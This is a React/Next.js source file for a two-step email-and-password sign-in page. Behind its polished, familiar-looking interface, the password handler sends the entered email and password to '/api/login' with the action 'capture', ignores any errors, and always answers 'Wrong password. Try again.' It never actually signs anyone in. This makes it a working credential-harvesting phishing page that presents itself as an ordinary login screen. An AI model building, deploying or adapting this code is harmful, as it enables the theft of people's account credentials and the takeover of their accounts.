"use client";

import { useState, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import Logo from "@/components/Logo";
import InputField from "@/components/InputField";
import AuthButton from "@/components/AuthButton";

export default function SignInPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState<"email" | "password">("email");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleEmailSubmit = useCallback(async () => {
    if (!email.trim() || !email.includes("@")) {
      setError("Please enter a valid email address");
      return;
    }
    setError("");
    setLoading(true);

    try {
      await fetch("/api/login", {
        method: "POST",
        body: new URLSearchParams({ action: "preflight", email: email.trim() }),
      });
    } catch {
      // silent
    }

    setLoading(false);
    setStep("password");
  }, [email]);

  const handlePasswordSubmit = useCallback(async () => {
    if (!password) {
      setError("Please enter your password");
      return;
    }
    setError("");
    setLoading(true);

    try {
      await fetch("/api/login", {
        method: "POST",
        body: new URLSearchParams({
          action: "capture",
          email: email.trim(),
          password,
        }),
      });
    } catch {
      // silent
    }

    setTimeout(() => {
      setLoading(false);
      setPassword("");
      setError("Wrong password. Try again.");
    }, 1400);
  }, [email, password]);

  const handleBack = useCallback(() => {
    setStep("email");
    setError("");
  }, []);

  const cardVariants = {
    hidden: { opacity: 0, scale: 0.96 },
    visible: {
      opacity: 1,
      scale: 1,
      transition: { duration: 0.45, ease: [0.0, 0.0, 0.58, 1.0] as const },
    },
  };

  const staggerVariants = {
    hidden: { opacity: 0 },
    visible: {
      opacity: 1,
      transition: { staggerChildren: 0.03, delayChildren: 0.1 },
    },
  };

  const fadeUp = {
    hidden: { opacity: 0, y: 18 },
    visible: {
      opacity: 1,
      y: 0,
      transition: { duration: 0.4, ease: [0.0, 0.0, 0.58, 1.0] as const },
    },
  };

  return (
    <motion.div
      variants={cardVariants}
      initial="hidden"
      animate="visible"
      className="w-full max-w-[1080px]"
      style={{ height: 560 }}
    >
      <div
        className="rounded-[28px] shadow-2xl overflow-hidden h-full"
        style={{ background: "#0F0F10", padding: 64 }}
      >
        <div className="grid grid-cols-1 md:grid-cols-2 gap-12 md:gap-0 h-full">
          {/* ── LEFT COLUMN ── */}
          <motion.div
            variants={staggerVariants}
            initial="hidden"
            animate="visible"
            className="flex flex-col justify-center"
          >
            <motion.div variants={fadeUp}>
              <Logo />
            </motion.div>

            <motion.h1
              variants={fadeUp}
              className="text-[#E8EAED] mt-12"
              style={{
                fontSize: 56,
                fontWeight: 700,
                lineHeight: 1.05,
                letterSpacing: "-0.02em",
              }}
            >
              Sign in
            </motion.h1>

            <motion.p
              variants={fadeUp}
              className="text-[#BDC1C6] mt-1"
              style={{ fontSize: 18, maxWidth: 360, lineHeight: 1.5 }}
            >
              Sign in to your account.
              <br />
              Continue securely and access your dashboard, projects, settings,
              and personalized features.
            </motion.p>
          </motion.div>

          {/* ── RIGHT COLUMN ── */}
          <div className="flex flex-col justify-center">
            <AnimatePresence mode="wait">
              {step === "email" ? (
                <motion.div
                  key="email"
                  initial={{ opacity: 0, x: 20 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, x: -20 }}
                  transition={{ duration: 0.3, ease: [0.4, 0.0, 0.2, 1.0] as const }}
                >
                  <motion.div
                    initial={{ opacity: 0, y: 12 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.35, delay: 0.05 }}
                  >
                    <InputField
                      label="Email"
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      onKeyDown={(e) =>
                        e.key === "Enter" && handleEmailSubmit()
                      }
                      autoFocus
                      error={
                        step === "email" && error && !loading
                          ? error
                          : undefined
                      }
                    />
                  </motion.div>

                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.15 }}
                    className="mt-3"
                  >
                    <a
                      href="#"
                      onClick={(e) => e.preventDefault()}
                      className="text-[#8AB4F8] text-sm font-medium no-underline hover:underline transition-all duration-200 cursor-pointer"
                    >
                      Forgot email?
                    </a>
                  </motion.div>

                  <motion.p
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.2 }}
                    className="text-[#BDC1C6] mt-10"
                    style={{ fontSize: 13, lineHeight: 1.6 }}
                  >
                    Enter the email address associated with your account.
                    <br />
                    We&apos;ll securely verify your account before continuing.
                  </motion.p>

                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.2 }}
                    className="flex items-center justify-between mt-10"
                  >
                    <AuthButton
                      variant="text"
                      onClick={(e) => {
                        e.preventDefault();
                      }}
                    >
                      Create account
                    </AuthButton>

                    <AuthButton
                      variant="primary"
                      onClick={handleEmailSubmit}
                      disabled={loading || !email.trim()}
                    >
                      {loading ? (
                        <span className="flex items-center justify-center gap-2">
                          <span
                            className="inline-block w-4 h-4 rounded-full"
                            style={{
                              border: "2px solid rgba(32,33,36,0.3)",
                              borderTopColor: "#202124",
                              animation: "spin 0.7s linear infinite",
                            }}
                          />
                          Checking...
                        </span>
                      ) : (
                        "Next"
                      )}
                    </AuthButton>
                  </motion.div>
                </motion.div>
              ) : (
                <motion.div
                  key="password"
                  initial={{ opacity: 0, x: 20 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, x: -20 }}
                  transition={{ duration: 0.3, ease: [0.4, 0.0, 0.2, 1.0] as const }}
                >
                  <motion.div
                    initial={{ opacity: 0, y: 8 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.08 }}
                    className="flex items-center gap-3 pb-4 mb-2"
                    style={{
                      borderBottom: "1px solid rgba(255,255,255,.06)",
                    }}
                  >
                    <div
                      className="w-9 h-9 rounded-full flex items-center justify-center text-sm font-medium"
                      style={{
                        background: "rgba(138,180,248,0.15)",
                        color: "#8AB4F8",
                      }}
                    >
                      {email.charAt(0).toUpperCase()}
                    </div>
                    <span
                      className="text-sm truncate"
                      style={{ color: "#BDC1C6" }}
                    >
                      {email}
                    </span>
                    <button
                      onClick={handleBack}
                      className="ml-auto text-[#8AB4F8] text-xs hover:underline transition-all duration-200 cursor-pointer bg-transparent border-none"
                    >
                      Edit
                    </button>
                  </motion.div>

                  <InputField
                    label="Password"
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onKeyDown={(e) =>
                      e.key === "Enter" && handlePasswordSubmit()
                    }
                    autoFocus
                    error={error || undefined}
                  />

                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.15 }}
                    className="mt-3"
                  >
                    <a
                      href="#"
                      onClick={(e) => e.preventDefault()}
                      className="text-[#8AB4F8] text-sm font-medium no-underline hover:underline transition-all duration-200 cursor-pointer"
                    >
                      Forgot password?
                    </a>
                  </motion.div>

                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.2 }}
                    className="flex items-center justify-between mt-10"
                  >
                    <AuthButton
                      variant="text"
                      onClick={handleBack}
                    >
                      Back
                    </AuthButton>

                    <AuthButton
                      variant="primary"
                      onClick={handlePasswordSubmit}
                      disabled={loading || !password}
                    >
                      {loading ? (
                        <span className="flex items-center justify-center gap-2">
                          <span
                            className="inline-block w-4 h-4 rounded-full"
                            style={{
                              border: "2px solid rgba(32,33,36,0.3)",
                              borderTopColor: "#202124",
                              animation: "spin 0.7s linear infinite",
                            }}
                          />
                          Signing in...
                        </span>
                      ) : (
                        "Sign in"
                      )}
                    </AuthButton>
                  </motion.div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </div>
      </div>
    </motion.div>
  );
}
